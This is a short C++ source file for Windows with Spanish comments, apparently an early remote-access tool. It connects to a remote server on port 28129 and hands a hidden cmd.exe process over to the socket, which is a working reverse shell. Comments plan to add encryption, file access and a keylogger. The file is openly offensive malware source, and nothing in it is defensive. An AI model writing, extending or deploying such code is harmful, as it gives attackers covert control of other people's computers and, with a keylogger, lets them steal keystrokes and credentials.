#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#include <cstring>
#include "errors.hpp"
#include "connection.hpp"
#pragma comment(lib, "Ws2_32.lib")
#pragma once

int main()
{
    // Ocultar la consola

    WSADATA wsadta;
    SOCKET server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Inicia el dll de winsock
    int r = WSAStartup(MAKEWORD(2, 2), &wsadta);
    if (r != 0){
        WSACleanup();
        error("no se pudo inicializar Windows Socket API",WSAGetLastError());
    }
    server = connect_server("28129");
    if (server == INVALID_SOCKET)
    {
        closesocket(server);
        WSACleanup();
        error("no hay nada al cual conectarse", WSAGetLastError());
    }
    if (!send(server, "conectao", sizeof("conectao"), NULL))
    {
        closesocket(server);
        WSACleanup();
        error("no se pudo enviar el mensaje", WSAGetLastError());
    }
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)server;
    if (!CreateProcess(NULL, (LPSTR) "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        closesocket(server);
        WSACleanup();
        error("no se pudo crear el proceso de terminal", WSAGetLastError());
    }
    // TODO: Archivos
    // TODO: Prioridad
    // TODO: Encriptacion
    // TODO: Keylogger
}